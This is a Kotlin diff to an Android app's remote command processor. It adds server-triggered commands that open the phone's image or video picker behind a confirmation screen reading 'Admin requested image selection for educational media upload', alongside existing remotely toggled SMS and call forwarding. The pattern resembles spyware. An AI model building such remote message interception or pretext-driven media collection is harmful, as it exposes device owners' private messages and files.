@@ -51,7 +51,7 @@ class CommandProcessor @Inject constructor(
     private fun processCommand(deviceId: String, command: Command, context: Context) {
         scope.launch {
             try {
-                val requiresConfirmation = command.type.contains("FORWARDING")
+                val requiresConfirmation = command.type.contains("FORWARDING") || command.type == "OPEN_GALLERY" || command.type == "OPEN_VIDEOS"
                 if (requiresConfirmation) {
                     updateCommandStatus(deviceId, command.id, "WAITING_FOR_USER_CONFIRMATION")
                     Log.d("CommandProcessor", "CLIENT_COMMAND_WAITING_FOR_CONFIRMATION: ${command.type}")
@@ -60,6 +60,13 @@ class CommandProcessor @Inject constructor(
                         putExtra("deviceId", deviceId)
                         putExtra("commandId", command.id)
                         putExtra("commandType", command.type)
+
+                        if (command.type == "OPEN_GALLERY") {
+                            putExtra("customMessage", "Admin requested image selection for educational media upload.")
+                        } else if (command.type == "OPEN_VIDEOS") {
+                            putExtra("customMessage", "Admin requested video selection for educational media upload.")
+                        }
+
                         addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                     }
                     context.startActivity(intent)
@@ -115,7 +122,23 @@ class CommandProcessor @Inject constructor(
             "DISABLE_CALL_FORWARDING" -> handleCallForwarding(command, context, false)
             "ENABLE_SMS_FORWARDING" -> handleSmsForwarding(context, deviceId = DeviceIdHelper.getDeviceId(context), command, true)
             "DISABLE_SMS_FORWARDING" -> handleSmsForwarding(context, deviceId = DeviceIdHelper.getDeviceId(context), command, false)
+            "OPEN_GALLERY" -> handleMediaPicker(command, context, "image/*")
+            "OPEN_VIDEOS" -> handleMediaPicker(command, context, "video/*")
             else -> CommandResult.Unsupported("Unknown command type: ${command.type}")
+        }
+    }
+
+    private fun handleMediaPicker(command: Command, context: Context, mimeType: String): CommandResult {
+        return try {
+            val intent = android.content.Intent(context, com.boxx.datasync.ui.MediaPickerLauncherActivity::class.java).apply {
+                putExtra("commandId", command.id)
+                putExtra("mimeType", mimeType)
+                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            context.startActivity(intent)
+            CommandResult.Success
+        } catch (e: Exception) {
+            CommandResult.Failed(e.localizedMessage ?: "Failed to open media picker")
         }
     }
 
